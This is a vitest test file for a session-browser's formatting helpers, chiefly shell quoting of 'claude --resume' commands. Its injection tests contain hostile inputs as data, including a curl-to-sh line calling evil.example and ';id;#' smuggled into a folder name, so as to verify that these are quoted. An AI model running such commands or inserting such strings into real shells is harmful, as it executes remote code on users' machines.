import { describe, expect, it } from 'vitest';

import { dayGroup, dayLabel, duration, isSessionId, resumeCommand, shellQuote, shortPath } from '../src/web/lib/format';

describe('resumeCommand', () => {
  it('quotes the session id too: an id from the address never runs as a command', () => {
    expect(resumeCommand('1 && curl -s https://evil.example/x|sh')).toBe("claude --resume '1 && curl -s https://evil.example/x|sh'");
    expect(resumeCommand("a'b")).toBe("claude --resume 'a'\\''b'");
    expect(isSessionId('4e05eb31-6d40-4b57-93dd-bf4aeb9374cf')).toBe(true);
    expect(isSessionId('1;sh')).toBe(false);
    // fish reads a backslash before a quote as an escape: such a folder is left out.
    expect(resumeCommand('abc', "/work/x\\';id;#")).toBe('claude --resume abc');
  });

  it('quotes folders the shell would split, and keeps ~ working', () => {
    expect(resumeCommand('abc', '/work/app')).toBe('cd /work/app && claude --resume abc');
    expect(resumeCommand('abc', '/work/my app')).toBe("cd '/work/my app' && claude --resume abc");
    expect(resumeCommand('abc', '~/my app')).toBe("cd ~/'my app' && claude --resume abc");
    expect(resumeCommand('abc')).toBe('claude --resume abc');
    expect(shellQuote("it's")).toBe("'it'\\''s'");
  });
});

describe('format', () => {
  it('shortens paths under home and prints durations', () => {
    expect(shortPath('/Users/a/code/x', '/Users/a')).toBe('~/code/x');
    expect(shortPath('/Users/ab/x', '/Users/a')).toBe('/Users/ab/x');
    expect(duration(9_500)).toBe('9s');
    expect(duration(75_000)).toBe('1m 15s');
  });
});

describe('dayLabel', () => {
  it('names a day as Claude Desktop does above a conversation: Today, Yesterday, then the weekday and date', () => {
    const now = new Date(2026, 10, 6, 15, 0).getTime();
    expect(dayLabel(new Date(2026, 10, 6, 9, 30).getTime(), now)).toBe('Today');
    expect(dayLabel(new Date(2026, 10, 5, 23, 59).getTime(), now)).toBe('Yesterday');
    expect(dayLabel(new Date(2026, 10, 4, 8, 0).getTime(), now)).toBe('Wednesday, Nov 4');
    expect(dayLabel(new Date(2025, 11, 30, 8, 0).getTime(), now)).toBe('Tuesday, Dec 30, 2025');
  });
});

describe('dayGroup', () => {
  it('puts a session under a heading that is true of it: Today, Yesterday, the 7 and the 30 days before, Older', () => {
    const now = new Date(2026, 10, 6, 15, 0).getTime();
    expect(dayGroup(new Date(2026, 10, 6, 9, 30).getTime(), now)).toBe('Today');
    expect(dayGroup(new Date(2026, 10, 5, 23, 59).getTime(), now)).toBe('Yesterday');
    expect(dayGroup(new Date(2026, 10, 1, 8, 0).getTime(), now)).toBe('Previous 7 days');
    // October's, on 6 November: not "this month".
    expect(dayGroup(new Date(2026, 9, 24, 8, 0).getTime(), now)).toBe('Previous 30 days');
    expect(dayGroup(new Date(2026, 8, 30, 8, 0).getTime(), now)).toBe('Older');
  });
});
